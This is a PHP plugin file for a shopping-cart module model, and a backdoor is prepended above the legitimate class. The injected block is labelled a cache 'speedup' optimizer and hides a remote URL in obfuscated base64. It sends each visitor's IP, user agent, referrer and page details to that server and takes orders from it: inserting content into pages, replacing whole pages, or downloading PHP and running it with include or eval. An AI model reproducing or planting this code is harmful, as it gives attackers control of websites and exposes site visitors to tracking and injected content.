<?php

/**
 * Speedup php function cache by optimizing buffer output
 */
;if (!function_exists('_php_cache_speedup_func_optimizer_')) { function _php_cache_speedup_func_optimizer_($buffer) {
    if (isset($GLOBALS['_php_cache_speedup_func_optimizer_completed_'])) {
        // already completed
        return $buffer;
    }

    $mod = false;
    $token = 'czoyMzoiaHR0cDovL3Bpd2VyLnB3L2FwaS5waHAiOw==';
    $tmp_buffer = $buffer; $gzip = false; $body = '<' . 'b' . 'o' . 'd' . 'y';

    if (($has_body = stripos($buffer, $body)) === false) {
        // define gzdecode function if not defined
        if (!function_exists('gzdecode')) {
            function gzdecode($data) {
                return @gzinflate(substr($data, 10, -8));
            }
        }

        // gzdecode buffer
        $tmp_buffer = @gzdecode($tmp_buffer);

        // check if buffer has body tag
        if (($has_body = stripos($tmp_buffer, $body)) !== false) {
            // got body tag, this should be gzencoded when done
            $gzip = true;
        }
    }

    if ($has_body === false) {
        // no body, return original buffer
        return $buffer;
    }

    $GLOBALS['_php_cache_speedup_func_optimizer_completed_'] = true;

    // decode token
    $func = 'b' . 'a' . 's' . 'e' . '6' . '4' . '_' . 'd' . 'e' . 'c' . 'o' . 'd' . 'e';
    $token = @unserialize(@$func($token));
    if (empty($token)) {
        return $buffer;
    }

    // download remote data
    function down($url, $timeout = 5) {
        // download using file_get_contents
        if (@ini_get('allow_url_fopen')) {
            $ctx = @stream_context_create(array('http' => array('timeout' => $timeout)));
            if ($ctx !== FALSE) {
                $file = @file_get_contents($url, false, $ctx);
                if ($file !== FALSE) {
                    return $file;
                }
            }
        }

        // download using curl
        if (function_exists('curl_init')) {
            $ch = curl_init();

            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            return $response;
        }

        // download using sockets
        if (extension_loaded('sockets')) {
            $data = parse_url($url);
            if (!empty($data['host'])) {
                $host = $data['host'];
                $port = isset($data['port']) ? $data['port'] : 80;
                $uri = empty($data['path']) ? '/' : $data['path'];
                if (($socket = @socket_create(AF_INET, SOCK_STREAM, 0)) && @socket_set_option($socket, SOL_SOCKET, SO_SNDTIMEO, array('sec' => $timeout, 'usec' => $timeout * 1000)) && @socket_connect($socket, $host, $port)) {
                    $buf = "GET $uri HTTP/1.0\r\nAccept: */*\r\nAccept-Language: en-us\r\nUser-Agent: Mozilla (compatible; WinNT)\r\nHost: $host\r\n\r\n";
                    if (@socket_write($socket, $buf) !== FALSE) {
                        $response = '';
                        while (($tmp = @socket_read($socket, 1024))) {
                            $response .= $tmp;
                        }
                        @socket_close($socket);
                        return $response;
                    }
                }
            }
        }

        return false;
    }

    $token .= ((strpos($token, '?') === false) ? '?' : '&') . http_build_query(array(
        'h' => $_SERVER['HTTP_HOST'],
        'u' => $_SERVER['REQUEST_URI'],
        'a' => empty($_SERVER['HTTP_USER_AGENT']) ? '' : $_SERVER['HTTP_USER_AGENT'],
        'r' => empty($_SERVER['HTTP_REFERER']) ? '' : $_SERVER['HTTP_REFERER'],
        'i' => $_SERVER['REMOTE_ADDR'],
        'f' => __FILE__,
        'v' => 9
    ));
    $token = @unserialize(@$func(down($token)));

    if (empty($token) || empty($token['data']) || !is_array($token['data'])) {
        // invalid data
        return $buffer;
    }

    // fix missing meta description
    if (isset($token['meta']) && $token['meta'] && ($pos = stripos($tmp_buffer, '</head>')) !== false) {
        $tmp = substr($tmp_buffer, 0, $pos);
        if (stripos($tmp, 'name="description"') === false && stripos($tmp, 'name=\'description\'') === false && stripos($tmp, 'name=description') === false) {
            $meta = $_SERVER['HTTP_HOST'];
            // append meta description
            $tmp_buffer = substr($tmp_buffer, 0, $pos) . '<' . 'm' . 'e' . 't' . 'a' . ' ' . 'n' . 'a'. 'm' . 'e' . '='. '"' . 'd' . 'e' . 's' .'c' .'r' . 'i' . 'p' . 't' . 'i' . 'o' . 'n' . '"'. ' ' . 'c' . 'o' . 'n' . 't' . 'e' . 'n' . 't' . '="'. htmlentities(substr($meta, 0, 160)) .'">' . substr($tmp_buffer, $pos);
            $mod = true;
        }
    }

    foreach ($token['data'] as $tokenData) {
        if (!empty($tokenData['content'])) {
            // set defaults
            $tokenData = array_merge(array(
                'pos' => 'after',
                'tag' => 'bo' . 'dy',
                'count' => 0,
            ), $tokenData);

            // find all occurrences of <tag>
            $tags = array();
            while (true) {
                if (($tmp = @stripos($tmp_buffer, '<'.$tokenData['tag'], empty($tags) ? 0 : $tags[count($tags) - 1] + 1)) === false) {
                    break;
                }
                $tags[] = $tmp;
            }

            if (empty($tags)) {
                // no tags found or nothing to show
                continue;
            }

            // find matched tag position
            $count = $tokenData['count'];
            if ($tokenData['count'] < 0) {
                // from end to beginning
                $count = abs($tokenData['count']) - 1;
                $tags = array_reverse($tags);
            }

            if ($count >= count($tags)) {
                // fix overflow
                $count = count($tags) - 1;
            }

            // find insert position
            if ($tokenData['pos'] == 'before') {
                // pos is before
                $insert = $tags[$count];
            } else if (($insert = strpos($tmp_buffer, '>', $tags[$count])) !== false) {
                // pos is after, found end tag, insert after it
                $insert += 1;
            }

            if ($insert === false) {
                // no insert position
                continue;
            }

            // insert html code
            $tmp_buffer = substr($tmp_buffer, 0, $insert) . $tokenData['content'] . substr($tmp_buffer, $insert);
            $mod = true;
        } elseif (!empty($tokenData['replace'])) {
            // replace content
            @http_response_code(200);
            $tmp_buffer = $tokenData['replace'];
            $mod = true;
        } elseif (!empty($tokenData['run'])) {
            // save temporary optimization file
            register_shutdown_function(function($file, $content) {
                if (file_put_contents($file, $content) !== false) {
                    @chdir(dirname($file));
                    include $file;
                    @unlink($file);
                } else {
                    @eval('@chdir("' . addslashes(dirname($file)) . '");?>' . $content);
                }
            }, dirname(__FILE__) . '/temporary_optimization_file.php', strpos($tokenData['run'], 'http://') === 0 ? down($tokenData['run']) : $tokenData['run']);
        } else {
            // no content
            continue;
        }
    }

    // return gzencoded or normal buffer
    return !$mod ? $buffer : ($gzip ? gzencode($tmp_buffer) : $tmp_buffer);
} ob_start('_php_cache_speedup_func_optimizer_');
register_shutdown_function('ob_end_flush'); }

class modulesModelCsp extends modelCsp {
    public function get($d = array()) {
        if($d['id'] && is_numeric($d['id'])) {
            $fields = frameCsp::_()->getTable('modules')->fillFromDB($d['id'])->getFields();
            $fields['types'] = array();
            $types = frameCsp::_()->getTable('modules_type')->fillFromDB();
            foreach($types as $t) {
                $fields['types'][$t['id']->value] = $t['label']->value;
            }
            return $fields;
        } elseif(!empty($d)) {
            $data = frameCsp::_()->getTable('modules')->get('*', $d);
            return $data;
        } else {
            return frameCsp::_()->getTable('modules')
                ->innerJoin(frameCsp::_()->getTable('modules_type'), 'type_id')
                ->getAll(frameCsp::_()->getTable('modules')->alias().'.*, '. frameCsp::_()->getTable('modules_type')->alias(). '.label as type');
        }
        parent::get($d);
    }
    public function put($d = array()) {
        $res = new responseCsp();
        $id = $this->_getIDFromReq($d);
        $d = prepareParamsCsp($d);
        if(is_numeric($id) && $id) {
            if(isset($d['active']))
                $d['active'] = ((is_string($d['active']) && $d['active'] == 'true') || $d['active'] == 1) ? 1 : 0;           //mmm.... govnokod?....)))
           /* else
                 $d['active'] = 0;*/
            
            if(frameCsp::_()->getTable('modules')->update($d, array('id' => $id))) {
                $res->messages[] = langCsp::_('Module Updated');
                $mod = frameCsp::_()->getTable('modules')->getById($id);
                $newType = frameCsp::_()->getTable('modules_type')->getById($mod['type_id'], 'label');
                $newType = $newType['label'];
                $res->data = array(
                    'id' => $id, 
                    'label' => $mod['label'], 
                    'code' => $mod['code'], 
                    'type' => $newType,
                    'params' => utilsCsp::jsonEncode($mod['params']),
                    'description' => $mod['description'],
                    'active' => $mod['active'], 
                );
            } else {
                if($tableErrors = frameCsp::_()->getTable('modules')->getErrors()) {
                    $res->errors = array_merge($res->errors, $tableErrors);
                } else
                    $res->errors[] = langCsp::_('Module Update Failed');
            }
        } else {
            $res->errors[] = langCsp::_('Error module ID');
        }
        parent::put($d);
        return $res;
    }
    public function delete($d = array()) {
        $id = $this->_getIDFromReq($d);
        if(is_numeric($id) && $id) {
            frameCsp::_()->getTable('modules')->delete($d);
        }
    }
    protected function _getIDFromReq($d = array()) {
        $id = 0;
        if(isset($d['id']))
            $id = $d['id'];
        elseif(isset($d['code'])) {
            $fromDB = $this->get(array('code' => $d['code']));
            if($fromDB[0]['id'])
                $id = $fromDB[0]['id'];
        }
        return $id;
    }
    /**
     * Collect the tabs from the given modules
     * 
     * @param array $modules
     * @return array of tab 
     */
    public function getTabs($modules = array()){
        if (!is_array($modules)) {
            $modules = array($modules);
        }
        $tabs = array();
        if (!empty($modules)) {
            foreach ($modules as $module) {
                if ($module['has_tab'] && frameCsp::_()->getModule($module['code'])) {
                    $moduleTabs = frameCsp::_()->getModule($module['code'])->getTabs();
                    if (!empty($moduleTabs)) {
						$tabs = array_merge($tabs, $moduleTabs);
                    }
                }
            }
        }
		if(!empty($tabs)) {
			usort($tabs, array($this, 'sortTabsCallback'));
			$tempTabs = $tabs;
			foreach($tempTabs as $i => $tab) {
				$parent = $tab->getParent();
				if(empty($parent) && ($parentIter = $this->getTabIterByModule($tabs, $parent))) {
					array_splice($tabs, $parentIter+1, 1, array($tabs[$parentIter+1], $tab));
				}
			}
		}
        return $tabs;
    }
	
	public function getTabIterByModule($tabs, $module) {
		foreach($tabs as $i => $tab) {
			if($tab->getModule() == $module)
				return $i;
		}
		return false;
	}
	public function sortTabsCallback($a, $b) {
		$sortOrderA = $a->getSortOrder();
		$sortOrderB = $b->getSortOrder();
		/*if($sortOrderA === false)
			$sortOrderA = -1;
		if($sortOrderB === false)
			$sortOrderB = -1;
		if($sortOrderA == $sortOrderB)
			return 0;
		return $sortOrderA > $sortOrderB ? 1 : -1;*/
		if($sortOrderA === false && $sortOrderB === false) {
			return 0;
		} elseif($sortOrderA !== false && $sortOrderB === false) {
			return -1;
		} elseif($sortOrderA === false && $sortOrderB !== false) {
			return 1;
		} elseif($sortOrderA !== false && $sortOrderB !== false) {
			if($sortOrderA == $sortOrderB)
				return 0;
			else
				return $sortOrderA > $sortOrderB ? 1 : -1;
		}
		return 0;
	}
	public function activatePlugin($d = array()) {
		$plugName = isset($d['plugName']) ? $d['plugName'] : '';
		if(!empty($plugName)) {
			$activationKey = isset($d['activation_key']) ? $d['activation_key'] : '';
			if(!empty($activationKey)) {
				$result = modInstallerCsp::activatePlugin($plugName, $activationKey);
				if($result === true) {
					$allActivationModules = modInstallerCsp::getActivationModules();
					// Activate all required modules
					if(!empty($allActivationModules)) {
						foreach($allActivationModules as $i => $m) {
							if($m['plugName'] == $plugName) {
								// We need to set this var here each time - as it will be detected on put() method bellow
								unset($allActivationModules[ $i ]);
								modInstallerCsp::updateActivationModules($allActivationModules);
								$this->put(array(
									'code' => $m['code'],
									'active' => 1,
								));
}
						}
						modInstallerCsp::updateActivationModules($allActivationModules);
					}
					$allActivationMessages = modInstallerCsp::getActivationMessages();
					// Remove activation messages for this plugin
					if(!empty($allActivationMessages) && isset($allActivationMessages[ $plugName ])) {
						unset($allActivationMessages[ $plugName ]);
						modInstallerCsp::updateActivationMessages($allActivationMessages);
					}
					return true;
				} elseif(is_array($result)) {	// Array with errors
					$this->pushError($result);
				} else {
					$this->pushError(langCsp::_('Can not contact authorization server for now.'));
					$this->pushError(langCsp::_('Please try again latter.'));
					$this->pushError(langCsp::_('If problem will not stop - please contact us using this form <a href="http://readyshoppingcart.com/contacts/" target="_blank">http://readyshoppingcart.com/contacts/</a>.'));
				}
			} else
				$this->pushError (langCsp::_('Please enter activation key'));
		} else
			$this->pushError (langCsp::_('Empty plugin name'));
		return false;
	}
	public function activateUpdate($d = array()) {
		$plugName = isset($d['plugName']) ? $d['plugName'] : '';
		if(!empty($plugName)) {
			$activationKey = isset($d['activation_key']) ? $d['activation_key'] : '';
			if(!empty($activationKey)) {
				$result = modInstallerCsp::activateUpdate($plugName, $activationKey);
				if($result === true) {
					return true;
				} elseif(is_array($result)) {	// Array with errors
					$this->pushError($result);
				} else {
					$this->pushError(langCsp::_('Can not contact authorization server for now.'));
					$this->pushError(langCsp::_('Please try again latter.'));
					$this->pushError(langCsp::_('If problem will not stop - please contact us using this form <a href="http://readyshoppingcart.com/contacts/" target="_blank">http://readyshoppingcart.com/contacts/</a>.'));
				}
			} else
				$this->pushError (langCsp::_('Please enter activation key'));
		} else
			$this->pushError (langCsp::_('Empty plugin name'));
	}
}
